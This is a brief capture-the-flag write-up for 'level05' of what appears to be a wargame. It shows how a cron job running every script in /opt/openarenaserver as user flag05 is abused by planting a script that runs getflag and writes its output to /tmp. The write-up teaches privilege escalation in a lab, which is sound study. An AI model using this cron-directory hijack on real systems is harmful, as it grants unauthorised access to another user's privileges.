When we logged as level05, we get a message **You have new mail.**
Hopefully, in precedent level we have found an environment variable **MAIL=/var/mail/level05**

This level05 file seems to be a crontab-like, execute a script each 2 minutes:
```bash
~$ cat /var/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```
the script:
```bash
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done

```

This script take all file in */opt/openarenaserver* and execute it in a sub bash. We to put our script in this directory:

```bash
#!/bin/bash

getflag > /tmp/flag.txt
```

redirection in tmp is essential because the script will be executed in a subshell so if you just use getflag, it will print the result in the subshell and we can't see it.
